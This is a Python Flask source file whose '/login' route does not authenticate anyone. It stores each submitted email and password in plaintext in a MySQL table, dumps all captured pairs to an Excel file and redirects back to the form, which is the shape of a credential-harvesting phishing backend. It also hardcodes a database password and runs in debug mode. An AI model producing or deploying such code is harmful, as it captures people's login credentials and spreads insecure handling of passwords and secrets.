from flask import Flask, request, render_template, redirect, url_for
import MySQLdb
import pandas as pd


app = Flask(__name__)

app.config['MYSQL_HOST'] = '172.20.10.4'
app.config['MYSQL_USER'] = 'lowes'
app.config['MYSQL_PASSWORD'] = 'Thegreat@23'
app.config['MYSQL_DB'] = 'login_db'


mysql = MySQLdb.connect(
    host=app.config['MYSQL_HOST'],
    user=app.config['MYSQL_USER'],
    password=app.config['MYSQL_PASSWORD'],
    db=app.config['MYSQL_DB']
)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    cursor = mysql.cursor()
    cursor.execute("INSERT INTO users (email, password) VALUES (%s, %s)", (email, password))
    mysql.commit()


    save_to_excel()

    return redirect(url_for('index'))


def save_to_excel():
    cursor = mysql.cursor()
    cursor.execute("SELECT * FROM users")
    data = cursor.fetchall()
    df = pd.DataFrame(data, columns=['ID', 'Email', 'Password'])
    df.to_excel('users.xlsx', index=False)
    cursor.close()


if __name__ == '__main__':
    app.run(debug=True)   